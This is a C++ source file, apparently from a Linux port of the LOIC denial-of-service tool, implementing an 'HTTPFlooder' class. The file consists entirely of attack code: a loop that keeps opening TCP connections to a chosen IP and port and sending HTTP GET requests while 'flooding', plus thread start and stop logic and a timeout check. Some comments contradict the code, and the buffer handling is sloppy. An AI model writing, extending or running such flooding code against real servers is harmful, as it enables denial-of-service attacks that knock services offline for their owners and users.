/*
 * HTTPFlooder.cpp
 *
 *  Created on: Dec 7, 2012
 *      Author: ivan
 */


#include "HTTPFlooder.h"
#include <sys/types.h>
#include <netdb.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
namespace loic {

void HTTPFlooder::work()
{
	hostname = false;
	struct addrinfo hints;
	struct addrinfo *result, *rp;
	int sfd, s;
	size_t len;
	ssize_t nread;
	char buffer[BUF_SIZE];
	memset(&hints, 0, sizeof(struct addrinfo));
	hints.ai_family = AF_INET;    /* Allow IPv4 or IPv6 */
	hints.ai_socktype = SOCK_STREAM; /* Datagram socket */
	hints.ai_flags = 0;
	hints.ai_protocol = 0;          /* Any protocol */

	try
	{
		int i = 0;
		while(this->isFlooding())
		{
			this->state = readyState;

			//tick
			lastAction = time(NULL)/3600;

			fprintf(stdout,"getting address\n");
			s = getaddrinfo(ip.c_str(),port.c_str(), &hints, &result);
			if (s != 0) {
				fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(s));
				continue;
			}


			for (rp = result; rp != NULL; rp = rp->ai_next) {
				sfd = socket(rp->ai_family, rp->ai_socktype,rp->ai_protocol);

				if (sfd == -1)
					continue;

				if (connect(sfd, rp->ai_addr, rp->ai_addrlen) != -1)
				{
					this->state = requestingState;
					std::cout<<"successfully connect\n";
					break;                  /* Success */
				}

				close(sfd);
			}

            int val = fcntl(sfd, F_GETFL, 0);
            // fcntl(sfd, F_SETFL, val | O_NONBLOCK);


			if (rp == NULL) {               /* No address succeeded */
				fprintf(stderr, "Could not connect\n");
				continue;
			}

			freeaddrinfo(result);

			this->state = connectingState;

			std::cout<<"sending"<<std::endl;

			std::stringstream stream("");
			stream<<"GET /"<<this->subsite<<" HTTP/1.1\r\n\r\n";
			char buf[stream.str().length()];
			strcpy(buf,stream.str().c_str());

			len = strlen(buf) + 1;
			/* +1 for terminating null byte */

			if (write(sfd, buf, len) != len)
			{
				std::cerr<<"partial/failed write"<<std::endl;
				continue;
			}

			this->state = downloadingState;
			requested++;

			std::cout<<"receiving..."<<std::endl;
			if(resp)
			{
				nread = read(sfd, buffer, BUF_SIZE);
				if (nread == -1) {
					perror("read");
					exit(EXIT_FAILURE);
				}
				else
				{
					std::cout<<errno<<std::endl;;
				}
				std::cout<<"Received "<<nread<<" bytes: "<<buffer<<std::endl;
			}

			this->state = completedState;
			downloaded++;

			if(delay>0)
			{
				boost::this_thread::sleep(boost::posix_time::milliseconds(delay));
			}
			std::cout<<"finished "<<i++<<std::endl;

		}
	}
	catch(std::exception & exe)
	{
		std::cerr<<exe.what()<<std::endl;
		std::cout<<"caught an exception"<<std::endl;
	}
	flooding = false;

}

	void HTTPFlooder::checkTimeOut()
	{
		while(flooding)
		{
			time_t now = time(NULL)/3600;	//time since epoch

			if(difftime(now,lastAction)>timeout)
			{
				flooding = false;
				this->failed++;
				this->state = failedState;
				std::cerr<<"Error! TIMED OUT\n";
			}
			boost::this_thread::sleep(boost::posix_time::milliseconds(100));
		}
	}
	void HTTPFlooder::Start()
	{
		flooding = true;
		lastAction = time(NULL);

		//can use bind as well
		boost::thread t(&loic::HTTPFlooder::checkTimeOut,this);

		unsigned int numThreads = 1;
		for(unsigned int i = 0; i<numThreads;i++)
		{
			boost::thread thread(&loic::HTTPFlooder::work,this);
		}
	}


	void HTTPFlooder::Stop()
	{
		flooding = false;
	}

} /* namespace loic */
